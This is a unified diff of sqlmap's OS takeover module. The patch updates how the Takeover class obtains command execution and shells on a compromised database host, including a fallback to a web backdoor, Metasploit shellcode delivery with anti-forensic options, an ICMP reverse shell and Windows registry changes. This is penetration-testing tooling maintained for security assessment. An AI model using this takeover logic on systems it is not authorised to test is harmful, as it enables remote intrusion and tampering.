@@ -1,17 +1,21 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
 import os
 
 from lib.core.common import Backend
+from lib.core.common import getSafeExString
+from lib.core.common import isDigit
 from lib.core.common import isStackingAvailable
+from lib.core.common import openFile
 from lib.core.common import readInput
 from lib.core.common import runningAsAdmin
 from lib.core.data import conf
+from lib.core.data import kb
 from lib.core.data import logger
 from lib.core.enums import DBMS
 from lib.core.enums import OS
@@ -20,28 +24,30 @@ from lib.core.exception import SqlmapMissingDependence
 from lib.core.exception import SqlmapMissingMandatoryOptionException
 from lib.core.exception import SqlmapMissingPrivileges
 from lib.core.exception import SqlmapNotVulnerableException
+from lib.core.exception import SqlmapSystemException
 from lib.core.exception import SqlmapUndefinedMethod
 from lib.core.exception import SqlmapUnsupportedDBMSException
+from lib.request import inject
 from lib.takeover.abstraction import Abstraction
 from lib.takeover.icmpsh import ICMPsh
 from lib.takeover.metasploit import Metasploit
 from lib.takeover.registry import Registry
 
-from plugins.generic.misc import Miscellaneous
-
-class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
+class Takeover(Abstraction, Metasploit, ICMPsh, Registry):
     """
     This class defines generic OS takeover functionalities for plugins.
     """
 
     def __init__(self):
-        self.cmdTblName = "sqlmapoutput"
+        self.cmdTblName = ("%soutput" % conf.tablePrefix)
         self.tblField = "data"
 
         Abstraction.__init__(self)
 
     def osCmd(self):
         if isStackingAvailable() or conf.direct:
+            web = False
+        elif Backend.isDbms(DBMS.PGSQL) and inject.getGadget():
             web = False
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command execution"
@@ -65,6 +71,8 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
     def osShell(self):
         if isStackingAvailable() or conf.direct:
             web = False
+        elif Backend.isDbms(DBMS.PGSQL) and inject.getGadget():
+            web = False
         elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):
             infoMsg = "going to use a web backdoor for command prompt"
             logger.info(infoMsg)
@@ -77,7 +85,20 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             raise SqlmapNotVulnerableException(errMsg)
 
         self.getRemoteTempPath()
-        self.initEnv(web=web)
+
+        try:
+            self.initEnv(web=web)
+        except SqlmapFilePathException:
+            if not web and not conf.direct:
+                infoMsg = "falling back to web backdoor method..."
+                logger.info(infoMsg)
+
+                web = True
+                kb.udfFail = True
+
+                self.initEnv(web=web)
+            else:
+                raise
 
         if not web or (web and self.webBackdoorUrl is not None):
             self.shell()
@@ -100,13 +121,13 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             while True:
                 tunnel = readInput(msg, default='1')
 
-                if tunnel.isdigit() and int(tunnel) in (1, 2):
+                if isDigit(tunnel) and int(tunnel) in (1, 2):
                     tunnel = int(tunnel)
                     break
 
                 else:
                     warnMsg = "invalid value, valid values are '1' and '2'"
-                    logger.warn(warnMsg)
+                    logger.warning(warnMsg)
         else:
             tunnel = 1
 
@@ -125,20 +146,23 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                 raise SqlmapMissingPrivileges(errMsg)
 
             try:
-                from impacket import ImpactDecoder
-                from impacket import ImpactPacket
+                __import__("impacket")
             except ImportError:
                 errMsg = "sqlmap requires 'python-impacket' third-party library "
                 errMsg += "in order to run icmpsh master. You can get it at "
-                errMsg += "http://code.google.com/p/impacket/downloads/list"
+                errMsg += "https://github.com/SecureAuthCorp/impacket"
                 raise SqlmapMissingDependence(errMsg)
 
-            sysIgnoreIcmp = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
+            filename = "/proc/sys/net/ipv4/icmp_echo_ignore_all"
 
-            if os.path.exists(sysIgnoreIcmp):
-                fp = open(sysIgnoreIcmp, "wb")
-                fp.write("1")
-                fp.close()
+            if os.path.exists(filename):
+                try:
+                    with openFile(filename, "wb") as f:
+                        f.write(b"1")
+                except IOError as ex:
+                    errMsg = "there has been a file opening/writing error "
+                    errMsg += "for filename '%s' ('%s')" % (filename, getSafeExString(ex))
+                    raise SqlmapSystemException(errMsg)
             else:
                 errMsg = "you need to disable ICMP replies by your machine "
                 errMsg += "system-wide. For example run on Linux/Unix:\n"
@@ -163,18 +187,18 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     msg = "how do you want to execute the Metasploit shellcode "
                     msg += "on the back-end database underlying operating system?"
                     msg += "\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)"
-                    msg += "\n[2] Via shellcodeexec (file system way, preferred on 64-bit systems)"
+                    msg += "\n[2] Via 'shellcodeexec' (file system way, preferred on 64-bit systems)"
 
                     while True:
                         choice = readInput(msg, default='1')
 
-                        if choice.isdigit() and int(choice) in (1, 2):
+                        if isDigit(choice) and int(choice) in (1, 2):
                             choice = int(choice)
                             break
 
                         else:
                             warnMsg = "invalid value, valid values are '1' and '2'"
-                            logger.warn(warnMsg)
+                            logger.warning(warnMsg)
 
                     if choice == 1:
                         goUdf = True
@@ -232,7 +256,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
                     warnMsg = "sqlmap does not implement any operating system "
                     warnMsg += "user privilege escalation technique when the "
                     warnMsg += "back-end DBMS underlying system is not Windows"
-                    logger.warn(warnMsg)
+                    logger.warning(warnMsg)
 
                 if tunnel == 1:
                     self.createMsfShellcode(exitfunc="process", format="raw", extra="BufferRegister=EAX", encode="x86/alpha_mixed")
@@ -307,7 +331,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             printWarn = False
 
         if printWarn:
-            logger.warn(warnMsg)
+            logger.warning(warnMsg)
 
         self.smb()
 
@@ -372,7 +396,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         else:
             regVal = conf.regVal
 
-        infoMsg = "reading Windows registry path '%s\%s' " % (regKey, regVal)
+        infoMsg = "reading Windows registry path '%s\\%s' " % (regKey, regVal)
         logger.info(infoMsg)
 
         return self.readRegKey(regKey, regVal, True)
@@ -417,7 +441,7 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
         else:
             regType = conf.regType
 
-        infoMsg = "adding Windows registry path '%s\%s' " % (regKey, regVal)
+        infoMsg = "adding Windows registry path '%s\\%s' " % (regKey, regVal)
         infoMsg += "with data '%s'. " % regData
         infoMsg += "This will work only if the user running the database "
         infoMsg += "process has privileges to modify the Windows registry."
@@ -449,12 +473,12 @@ class Takeover(Abstraction, Metasploit, ICMPsh, Registry, Miscellaneous):
             regVal = conf.regVal
 
         message = "are you sure that you want to delete the Windows "
-        message += "registry path '%s\%s? [y/N] " % (regKey, regVal)
+        message += "registry path '%s\\%s? [y/N] " % (regKey, regVal)
 
         if not readInput(message, default='N', boolean=True):
             return
 
-        infoMsg = "deleting Windows registry path '%s\%s'. " % (regKey, regVal)
+        infoMsg = "deleting Windows registry path '%s\\%s'. " % (regKey, regVal)
         infoMsg += "This will work only if the user running the database "
         infoMsg += "process has privileges to modify the Windows registry."
         logger.info(infoMsg)
